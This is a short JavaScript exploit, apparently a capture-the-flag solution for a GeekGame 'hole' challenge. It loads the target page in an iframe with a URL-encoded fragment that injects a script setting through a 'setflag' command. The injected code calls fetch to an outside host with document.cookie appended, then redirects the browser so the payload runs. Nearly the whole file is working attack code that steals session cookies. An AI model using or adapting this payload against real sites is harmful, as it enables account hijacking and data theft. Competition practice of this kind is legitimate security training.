const if1 = document.createElement("iframe");
if1.sandbox =
  "allow-forms allow-scripts allow-same-origin allow-top-navigation allow-top-navigation-by-user-activation";
if1.src = `https://prob15-qkuhole.geekgame.pku.edu.cn/hole/#%2F%2Fsetflag%20APPSWITCHER_ITEMS%3D%7B%22switcher_2%22%3A%7B%22bar%22%3A%5B%5B%22hole%22%2C%22%E6%A0%91%E6%B4%9E%22%2C%22%23%22%2C%22%22%2Cnull%2Cfalse%5D%5D%2C%22dropdown%22%3A%5B%5D%2C%22fix%22%3A%7B%22hole%22%3A%22console.log('fucked')%3Bfetch('https%3A%2F%2Fqbt.zisu.dev%2F%3Fck%3D'%2Bdocument.cookie)%22%7D%7D%7D?`;

document.body.appendChild(if1);

setTimeout(() => {
  // const if2 = document.createElement('iframe')
  // if2.src = `https://prob15-qkuhole.geekgame.pku.edu.cn/hole/#`
  // document.body.appendChild(if2)
  location.href = "https://prob15-qkuhole.geekgame.pku.edu.cn/hole/#";
}, 400);
